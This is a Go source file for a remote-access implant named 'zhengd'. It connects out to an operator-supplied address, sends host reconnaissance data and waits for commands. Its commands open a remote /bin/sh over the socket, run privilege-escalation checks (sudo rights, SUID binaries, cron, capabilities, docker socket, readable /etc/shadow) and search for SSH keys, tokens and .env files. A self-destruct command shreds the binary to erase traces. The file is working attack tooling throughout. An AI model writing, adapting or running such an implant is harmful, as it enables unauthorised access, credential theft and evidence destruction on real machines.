package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type Recon struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Kernel   string `json:"kernel"`
	IP       string `json:"ip"`
	PublicIP string `json:"public_ip"`
}

func gatherRecon(conn net.Conn) Recon {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("LOGNAME")
	}
	return Recon{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Kernel:   runtime.GOOS,
		IP:       getLocalIP(),
		PublicIP: getPublicIP(conn),
	}
}

func getPublicIP(conn net.Conn) string {
	tcpAddr := conn.LocalAddr().(*net.TCPAddr)
	return tcpAddr.IP.String()
}

type LPEResult struct {
	OSInfo     string   `json:"os_info"`
	Sudo       string   `json:"sudo"`
	SUID       string   `json:"suid"`
	Cron       string   `json:"cron"`
	Capabilities string `json:"capabilities"`
	Docker     string   `json:"docker"`
	PATH       string   `json:"path_writable"`
	Passwd     string   `json:"passwd_writable"`
	Shadow     string   `json:"shadow_readable"`
	WorldWrite string   `json:"world_writable"`
	Interesting string  `json:"interesting_files"`
}

func runCmd(name string, args ...string) string {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	if err := cmd.Run(); err != nil {
		return ""
	}
	return strings.TrimSpace(out.String())
}

func runShell(script string) string {
	cmd := exec.Command("/bin/sh", "-c", script)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	if err := cmd.Run(); err != nil {
		return ""
	}
	return strings.TrimSpace(out.String())
}

func runLPE() LPEResult {
	r := LPEResult{}

	// OS info
	r.OSInfo = runShell("uname -a; cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null")

	// Sudo
	r.Sudo = runShell("sudo -nl 2>/dev/null")

	// SUID binaries
	r.SUID = runShell("find / -perm -4000 -type f 2>/dev/null | head -30")

	// Cron
	r.Cron = runShell("ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; crontab -l 2>/dev/null; find /etc/cron* -writable -type f 2>/dev/null")

	// Capabilities
	r.Capabilities = runShell("getcap -r / 2>/dev/null | head -20")

	// Docker group
	r.Docker = runShell("id | grep -i docker; ls -la /var/run/docker.sock 2>/dev/null")

	// PATH writable dirs
	r.PATH = runShell("echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done")

	// /etc/passwd writable
	r.Passwd = runShell("[ -w /etc/passwd ] && echo 'WRITABLE' || echo 'not writable'")

	// /etc/shadow readable
	r.Shadow = runShell("[ -r /etc/shadow ] && echo 'READABLE' || echo 'not readable'")

	// World-writable in key dirs
	r.WorldWrite = runShell("find /etc /usr/local /opt /var -writable -type f 2>/dev/null | head -20")

	// Interesting files
	r.Interesting = runShell("ls -la ~/.ssh/ 2>/dev/null; find / -name '*.key' -o -name 'id_rsa' -o -name 'token' -o -name '.env' 2>/dev/null | head -20; cat /etc/passwd | grep -v nologin | grep -v false | head -10")

	return r
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func main() {
	connectAddr := flag.String("connect", "", "address to connect to (ip:port)")
	flag.Parse()

	if *connectAddr == "" {
		fmt.Fprintf(os.Stderr, "usage: zhengd -connect <ip:port>\n")
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", *connectAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "connected to %s\n", *connectAddr)

	encoder := json.NewEncoder(conn)
	decoder := json.NewDecoder(conn)

	// Send recon
	if err := encoder.Encode(gatherRecon(conn)); err != nil {
		fmt.Fprintf(os.Stderr, "failed to send recon: %v\n", err)
		return
	}

	// Command loop
	for {
		var msg struct {
			Cmd string `json:"cmd"`
		}
		if err := decoder.Decode(&msg); err != nil {
			fmt.Fprintf(os.Stderr, "connection lost: %v\n", err)
			return
		}

		switch strings.TrimSpace(msg.Cmd) {
		case "shell":
			fmt.Fprintf(os.Stderr, "spawning shell...\n")
			cmd := exec.Command("/bin/sh")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn

			encoder.Encode(map[string]string{"status": "shell_ready"})

			if err := cmd.Run(); err != nil {
				fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
			}

			encoder.Encode(map[string]string{"status": "shell_done"})

		case "exit":
			fmt.Fprintf(os.Stderr, "exiting...\n")
			return

		case "lpe":
			fmt.Fprintf(os.Stderr, "running LPE checks...\n")
			encoder.Encode(map[string]string{"status": "lpe_running"})
			results := runLPE()
			encoder.Encode(results)

		case "destroy":
			fmt.Fprintf(os.Stderr, "self-destructing...\n")
			encoder.Encode(map[string]string{"status": "destroying"})

			exePath, err := os.Executable()
			if err != nil {
				fmt.Fprintf(os.Stderr, "failed to get executable path: %v\n", err)
				encoder.Encode(map[string]string{"status": "destroy_fail", "error": err.Error()})
				return
			}
			exePath, _ = filepath.EvalSymlinks(exePath)

			// Try shred first
			if _, err := exec.LookPath("shred"); err == nil {
				fmt.Fprintf(os.Stderr, "shredding %s\n", exePath)
				shred := exec.Command("shred", "-zuvn", "3", exePath)
				shred.Run()
			} else {
				// Fallback to rm
				fmt.Fprintf(os.Stderr, "shred not found, removing %s\n", exePath)
				os.Remove(exePath)
			}

			encoder.Encode(map[string]string{"status": "destroyed"})
			fmt.Fprintf(os.Stderr, "goodbye\n")
			return

		default:
			fmt.Fprintf(os.Stderr, "unknown command: %s\n", msg.Cmd)
		}
	}
}
